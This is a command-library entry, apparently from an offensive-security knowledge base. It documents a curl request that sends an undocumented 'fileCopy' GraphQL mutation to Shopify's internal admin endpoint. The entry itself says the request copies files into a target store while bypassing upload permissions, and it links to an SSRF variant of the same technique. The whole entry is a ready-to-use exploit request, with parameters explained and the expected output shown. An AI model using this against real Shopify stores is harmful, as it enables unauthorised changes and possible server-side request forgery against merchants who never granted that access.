---
data: >-
  curl -X POST 'https://storeA.myshopify.com/admin/internal/web/graphql/core' -H
  'Content-Type: application/json' -H 'X-Shopify-Access-Token: YOUR_STAFF_TOKEN'
  -d '{"query":"mutation fileCopy
  ($key:String!,$absoluteKey:String!,$path:String!){fileCopy
  (key:$key,path:$path,absoluteKey:$absoluteKey) {file{path} userErrors {field
  message}}}","variables":{"absoluteKey":"s/files/1/d/0864/0471/6006/6199/files/1.jpg","key":"files/1.jpg","path":"https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"}}'
tags:
  - shopify
  - graphql
  - file-copy
type: command
executor: curl
platforms:
  - Web
  - Cloud
id: 6ffc0f66-0014-41cf-a7c3-9642897b7874
created_at: '2025-12-14T17:32:48.514Z'
updated_at: '2025-12-14T17:32:48.514Z'
verified: false
validated: true
submitted: true
---
# shopify-filecopy-mutation-for-file-copy

## Command

```bash
curl -X POST 'https://storeA.myshopify.com/admin/internal/web/graphql/core' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: YOUR_STAFF_TOKEN' \
  -d '{"query":"mutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {file{path} userErrors {field message}}}","variables":{"absoluteKey":"s/files/1/d/0864/0471/6006/6199/files/1.jpg","key":"files/1.jpg","path":"https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6"}}'
```

## Description

This curl command sends a GraphQL mutation to Shopify's admin API to copy a file from a controlled store to the target store, bypassing upload permissions using the undocumented fileCopy endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://storeA.myshopify.com/admin/internal/web/graphql/core` | Target GraphQL endpoint | Yes |
| `-H 'Content-Type: application/json'` | Sets JSON payload type | Yes |
| `-H 'X-Shopify-Access-Token: YOUR_STAFF_TOKEN'` | Authenticates with staff token | Yes |
| `-d '{...}'` | JSON payload with query and variables | Yes |
| `variables.absoluteKey` | Absolute path of source file | Yes |
| `variables.key` | Relative key of source file | Yes |
| `variables.path` | Full URL of source file | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://example.myshopify.com/admin/internal/web/graphql/core' -H 'Content-Type: application/json' -H 'X-Shopify-Access-Token: token' -d '{"query":"...","variables":{"absoluteKey":"example","key":"example","path":"https://example"}}'
```

### Advanced Usage

Modify variables for different files; ensure authenticated token.

## Expected Output

JSON response with 'data.fileCopy.file.path' showing copied file location, or 'userErrors' if failed (e.g., {"data":{"fileCopy":{"file":{"path":"/files/copied.jpg"},"userErrors":[]}}}).

## Related

- [[commands/shopify-filecopy-mutation-for-ssrf]]
- [[procedures/Copy-File-from-Controlled-Store-to-Target-Using-fileCopy]]
